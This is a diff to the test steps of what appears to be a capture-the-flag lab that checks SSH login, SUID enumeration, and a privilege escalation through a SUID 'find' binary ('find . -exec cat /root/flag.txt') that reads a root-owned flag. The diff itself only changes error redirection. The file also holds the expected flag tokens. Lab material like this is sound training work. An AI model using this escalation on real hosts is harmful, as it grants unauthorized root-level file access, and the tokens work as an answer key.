@@ -89,22 +89,22 @@ topology:
 test:
   steps:
     - name: "SSH access as analyst"
-      command: "sshpass -p '{cred.analyst.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.analyst.user}@{target.target} 'whoami' 2>/dev/null"
+      command: "sshpass -p '{cred.analyst.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.analyst.user}@{target.target} 'whoami' 2>&1"
       expect: "analyst"
       timeout: 15
 
     - name: "Enumerate SUID binaries and find 'find' among them"
-      command: "sshpass -p '{cred.analyst.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.analyst.user}@{target.target} 'find / -perm -4000 -type f 2>/dev/null | sort' 2>/dev/null"
+      command: "sshpass -p '{cred.analyst.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.analyst.user}@{target.target} 'find / -perm -4000 -type f 2>/dev/null | sort' 2>&1"
       expect: "/usr/bin/find"
       timeout: 15
 
     - name: "Read token 1 from clue file"
-      command: "sshpass -p '{cred.analyst.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.analyst.user}@{target.target} 'cat /home/analyst/clue.txt' 2>/dev/null"
+      command: "sshpass -p '{cred.analyst.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.analyst.user}@{target.target} 'cat /home/analyst/clue.txt' 2>&1"
       expect: "su1d_m4z3"
       timeout: 15
 
     - name: "Exploit SUID find to read /root/flag.txt for token 2"
-      command: "sshpass -p '{cred.analyst.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.analyst.user}@{target.target} 'find . -exec cat /root/flag.txt \\; -quit' 2>/dev/null"
+      command: "sshpass -p '{cred.analyst.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.analyst.user}@{target.target} 'find . -exec cat /root/flag.txt \\; -quit' 2>&1"
       expect: "p01s0n"
       timeout: 15
 
